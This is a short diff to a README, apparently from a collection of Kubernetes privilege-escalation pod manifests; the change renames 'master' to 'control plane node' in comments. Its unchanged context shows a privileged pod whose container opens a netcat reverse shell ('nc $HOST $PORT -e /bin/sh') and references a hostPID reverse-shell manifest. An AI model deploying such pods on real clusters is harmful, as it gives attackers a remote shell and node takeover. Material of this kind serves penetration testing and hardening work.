@@ -22,8 +22,8 @@ spec:
       - "604800"
     imagePullPolicy: IfNotPresent
     name: hostpid
-  # Force scheduling of your pod on master mode by uncommenting this line and changing the name
-  #nodeName: k8s-master
+  # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
+  #nodeName: k8s-control-plane-node
   restartPolicy: Always
   ```
 [pod-priv-only.yaml](pod-priv-only.yaml)
@@ -59,8 +59,8 @@ spec:
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
     securityContext:
       privileged: true
-  # Force scheduling of your pod on master mode by uncommenting this line and changing the name
-  #nodeName: k8s-master
+  # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
+  #nodeName: k8s-control-plane-node
 ```
 [pod-hostpid-only-revshell.yaml](pod-hostpid-only-revshell.yaml)
 
